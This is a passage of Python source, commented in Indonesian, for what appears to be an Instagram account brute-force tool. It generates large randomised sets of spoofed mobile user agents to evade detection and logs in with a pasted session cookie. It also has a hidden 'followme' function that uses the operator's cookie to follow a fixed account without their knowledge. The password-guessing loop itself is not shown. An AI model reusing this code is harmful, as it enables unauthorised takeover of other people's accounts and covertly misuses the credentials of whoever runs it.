120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
        igve=igv.split(",")
        versi=random.choice(igve)
        
        
        iPh=rc(["4,1","6,1","6,2","7,2","8,4","10,4","10,5","11,8","14,2","14,3","14,5","15,1","16,1"])
        iOS=rc(["9_2","9_2_1","9_3","9_3_1","9_3_2","9_3_3","9_3_5","10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3","11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2","15_4","14_3","13_5","14_5","13_4","16_5_1","16_0","16_1","16_1_2","16_0_1","16_0_3","16_3_1","16_4_1","16_2","16_4","16_5","16_6","16_6_1","17_0","17_3_1","17_4_1"])
        sc=rc(["2.00","3.00"])
        kntlgoreng = rc(["kenzo","markw","mido","ginkgo","hydrogen","tissot_sprout"])
        redmis = rc(["Redmi Note 4","Redmi Note 8","Redmi Note 9 Pro","MI MAX","Mi A1","Redmi Note 9S","23127PN0CC","Redmi Note 5","M2007J17C","M2101K7BNY","2201116SC","M2011K2C","Redmi Note 11R"])
        mereek = rc(["samsung","realme","OnePlus","LAVA","TCL","motorola","Xiaomi/POCO","T790Y","Amazon","Google/google","Xiaomi","OPPO"])
        mereek1 = rc(["SM-A325M","RMX3363","CPH2465","Z60s","5087Z","moto g(6) plus","22111317PG","samsung R883T","Seattle","KFRAWI","Pixel 7 Pro","M2007J3SG","R7kf","PEPM00","SM-N910F"])
        mereek2 = rc(["a32","RE54ABL1","OP5958L1","Z60s","Doha_TMO","evert_nt","moonstone","R883T","raspite","cheetah","apollo","R7f","OP4ECB","trlte"])
        mereek3 = rc(["mt6769t","qcom","mt6739","mt6762","mt8169","cheetah","trlte"])
        
        
        ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; samsung; SM-G610M; on7xelte; samsungexynos7870; {basa}; {kode})'
        ua3 = f'Instagram {versi} (iPhone{iPh}; iOS {iOS}; {basa}; {basa};scale={sc}; {pxl}; {basa}; {kode})'
        ua4 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi; {redmis}; {kntlgoreng}; qcom; {basa}; {kode})'
        ua5 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; {mereek}; {mereek1}; {mereek2}; {mereek3}; {basa}; {kode})'
        uaa = rc([ua2,ua3,ua4,ua5])
        return uaa
    def UaGege(self):
        dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
        basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        andro = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
        xiaomi = random.choice(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G','2201117SG','M2010J19SL','M2006C3MG','2201117TY','M2003J15SC','2201117SY','23021RAAEG','M2101K7BI'])
        mod = random.choice(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn','tapas','fleur','merlinnfc','spesn','pomelo','miel'])
        com = random.choice(["qcom","mt6833","mt6765","mt8168","mt6781","mt6765","mt6768","mt6785"])
        versi = self.vers()
        return(f"''Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; {basa})'")
    def getUserAgentt(self):
        basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
        com = random.choice(["qcom","mt6833","mt6765","mt8168","mt6781","mt6765","mt6768","mt6785"])
        versi = self.vers()
        dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
        kode = random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269'])
        build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
        return(f'''Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}''')
     
    
       

#----------------[ CLASS BRUTE ]----------------#
class Brute:
    def __init__(self):
        self.tw, self.ok, self.cp, self.id, self.lp = 0, 0,0, [], 0
        
        self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',}
        self.param = {'count': '200','max_id': 'KhamdihiDev','search_surface': 'follow_list_page'}
        self.dire = 'data/user/login'
        self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

    def Path(self):
        if os.path.isfile('data/user/login/cokie.txt') is True:
           try:
               cokie, nama = open('data/user/login/cokie.txt','r',encoding='utf-8').read().split('<=>')
               xyz = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; uk_UA; 98288242)'}
               uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
               req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['full_name']
               req1 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['follower_count']
               req2 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['following_count']
               req3 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['username']
               return cokie,req,req1,req2,req3
           except:self.Login()
        else:self.Login()

    def cek_day(self):
        if os.path.isfile(f'{self.dire}/day.txt') is True:
           xyz = open(self.dire+'/day.txt','r').read()
           return(xyz)
        else:
           AssetAndKey()

    def Clear(self):
        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except:pass

    def Login(self):
        self.Clear()
        self.Logos()
        self.g4 = requests.Session().get('http://ip-api.com/json').json()['query']
        self.g3 = requests.Session().get('http://ip-api.com/json').json()['country']
        
        prints(Panel(f'{P2}Silahkan login menggunakan cookie {B2}INSTAGRAM. {P2}Pastikan cookie akun tumbal dan jangan menggunakan {N2}akun pribadi, {P2}Bukan tanggung jawab admin jika kamu menggunakan akun pribadi untuk login',width=80,padding=(0,3),style="bold grey100"))
        prints(Panel(f'{P2}[{H2}*{P2}] County {H2}{self.g3}\n{P2}[{H2}*{P2}] IpAddres {H2}{self.g4}',title=f"{P2}[ {N2}Location {P2}]",width=80,padding=(0,1),style="bold grey100"))
        cokie = input(f' Masukan Cookie IG : ')
        if 'ds_user_id' in cokie:
            try:
                xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
                req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['full_name']
                open('data/user/login/cokie.txt','w').write(f'{cokie}<=>{req}')
                prints(Panel(f'{H2}{uid}',title=f"ID",subtitle=f'{B2}{req}',width=80,padding=(0,28),style="bold grey100")) ; time.sleep(5.2) ; self.Menu()
            except Exception as e:console.print(f' {P2}[{M2}!{P2}] Oopshh Cookie Yang Anda Masukan Invalid atau Pecah PERAWAN!!') ; time.sleep(3) ; sys.exit()
        else:prints(Panel(f'{P2}[{M2}!{P2}] Oopshh Cookie Yang Anda Masukan Invalid Atau Pecah PERAWAN',width=80,padding=(0,1),style="bold grey100")) ; time.sleep(3) ; sys.exit()

    def followme(self, tok, cok):
        try:
            headers = {"Host": "i.instagram.com","content-length": "0","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',"x-ig-app-id": "1217981644879628","x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV","sec-ch-ua-mobile": "?1","x-instagram-ajax": "1006447742","viewport-width": "360","content-type": "application/x-www-form-urlencoded","accept": "*/*","user-agent": "Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)","x-asbd-id": "198387","save-data": "on","x-csrftoken": tok,"sec-ch-ua-platform": '"Android"',"origin": "https://www.instagram.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.instagram.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"}
            requests.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("64474838009"), headers = headers, cookies = {"cookie":cok})
        except requests.ConnectionError as e : self.followme()
            
    def Logos(self, sisa=None):
        prints(Panel(f'''             {P2}
888b     d888           .d8888b.           888               888    
8888b   d8888          d88P  Y88b          888               888    
88888b.d88888          888    888          888               888    
888Y88888P888 888d888  888         8888b.  88888b.  888  888 888888 
888 Y888P 888 888P"    888  88888     "88b 888 "88b 888  888 888    
888  Y8P  888 888      888    888 .d888888 888  888 888  888 888    
888   "   888 888  d8b Y88b  d88P 888  888 888 d88P Y88b 888 Y88b.  
888       888 888  Y8P  "Y8888P88 "Y888888 88888P"   "Y88888  "Y888 
                                                                    
                                                                    
Thanks For Ms.Poku dan Team kontol lain                                                                                                                             
                                                                            
                                ''',width=80,padding=(1,1),style="bold green"))
    def Menu(self, sisa=None):
        self.Clear()
        self.Logos()
        askey = open('data/.LisensiLog.json','r').read()
        try:
            b = requests.get(f"https://app.cryptolens.io/api/key/Activate?token=WyI5NzIwMTk4MiIsIlM3Y2o1aVcvL1YzVnFkRzBDaUI2KzVHbUQ0aTY4RE9uVVhraEppKzQiXQ==&ProductId=27976&Key={askey}").json()
            c        = b['licenseKey']
            key      = c['key'][0:11]
            tahun    = c['expires'][0:4]
            buln     = c['expires'][5:7]
            tanggal  = c['expires'][8:10]
            bulan    = self.bulan_ttl[buln]
            tahun1   = c['created'][0:4]
            buln1    = c['created'][5:7]
            tanggal1 = c['created'][8:10]
            bulan1   = self.bulan_ttl[buln1]
        except:
            key       = "-"
            tanggal   = "-"
            bulan     = "-"
            tahun     = "-"
            tanggal1  = "-"
            bulan1    = "-"
            tahun1    = "-"
        cokie, fullname, follower_count, following_count, userku= self.Path()
        uid = re.search('ds_user_id=(\d+)', str(open('data/user/login/cokie.txt','r',encoding='utf-8').read().split('<=>'))).group(1)
        self.g4 = requests.Session().get('http://ip-api.com/json').json()['query']
        urut = []
        urut.append(Panel(f'{P2}[{H2}*{P2}]{N2} Name {H2}@{userku}\n{P2}[{H2}*{P2}]{N2} UserId {H2}{uid}\n{P2}[{H2}*{P2}]{N2} Followers {H2}{follower_count}\n{P2}[{H2}*{P2}]{N2} Following {H2}{following_count}',width=37,padding=(0,1),style="bold grey100"))
